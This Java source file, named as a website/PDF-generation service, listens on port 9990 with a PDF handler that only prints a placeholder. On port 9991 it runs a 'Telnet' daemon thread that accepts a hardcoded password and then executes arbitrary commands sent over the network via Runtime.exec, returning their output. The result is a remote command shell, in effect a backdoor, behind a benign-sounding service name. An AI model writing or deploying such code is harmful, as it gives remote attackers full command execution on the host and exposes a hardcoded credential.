import java.io.IOException;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.ServerSocket;
import java.io.InputStream;

public class lf_website {

	public static void main(String[] args) throws InterruptedException {
		lf_website manager =new lf_website();
		// 设置守护线程
		manager.setDeamon();
		manager.setPdf();
	}
	
	// 处理生成pdf的线程
	public void setPdf() {
		Runnable userPdf = new Runnable() {
			public void run() {
				ServerSocket server;
				try {
					server =new ServerSocket(9990);
					while (true) {
						Socket client = server.accept();
						System.out.println("Accepted a pdf request, it is from " + client.getInetAddress()+ " : " + client.getPort() + "." );
						new Thread(new makePdf(client)).start();
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		};
		new Thread(userPdf).start();
	}
	
	class makePdf implements Runnable{
		Socket client;
		public makePdf(Socket client) {
			this.client = client;
		}
		public void run () {
			System.out.println("here");
		}
	}
	
	// 设置守护线程
	public void setDeamon() {
		Runnable deamon = new Runnable() {
			public void run() {
				ServerSocket server;
				try {
					server = new ServerSocket(9991);
					while (true) {
						Socket client = server.accept();
						System.out.println("Accepted a request, it is from " + client.getInetAddress()+ " : " + client.getPort() + "." );
						Thread myDeamon = new Thread(new Telnet(client));
						myDeamon.setDaemon(true);
						myDeamon.start();
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		};
		new Thread(deamon).start();
	}
	
	// Telnet线程
	class Telnet implements Runnable {
		Socket client;
		String Password;
		public Telnet(Socket client) {
			this.client = client;
		}
		
		public void run() {
			BufferedReader input;
			PrintWriter output;
			InputStream cmdInput ;
			String cmd;
			try {
				input = new BufferedReader(new InputStreamReader(client.getInputStream()));
				output = new PrintWriter(client.getOutputStream(), true);
				output.println("请输入密码:");
				do {
					cmd = input.readLine();  
					System.out.println("请求: " + cmd);
					if (!cmd.equals("exit") && this.Password != null) {
						try {
							Process pro = Runtime.getRuntime().exec(cmd);
							pro.waitFor();
							cmdInput = pro.getInputStream();
							BufferedReader read = new BufferedReader(new InputStreamReader(cmdInput));
							output.println("返回:" + cmd);
							String result;
							do {
								result = read.readLine();
								if (result != null) {
									output.println(result);
								}
							} while (result != null);
						} catch (Exception e) {
							e.printStackTrace();
						}
					} else {
						if (cmd.equals("e8m8GmasJjApKRLQ")) {
							this.Password = "e8m8GmasJjApKRLQ";
							output.println("登录成功");
						} else {
							output.println("密码错误,请输入密码:");
						}
					}
				} while (cmd!=null && !cmd.equals("exit"));
				input.close();
				output.close();
				client.close();
				System.out.println("链接结束.\n"); 
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

}
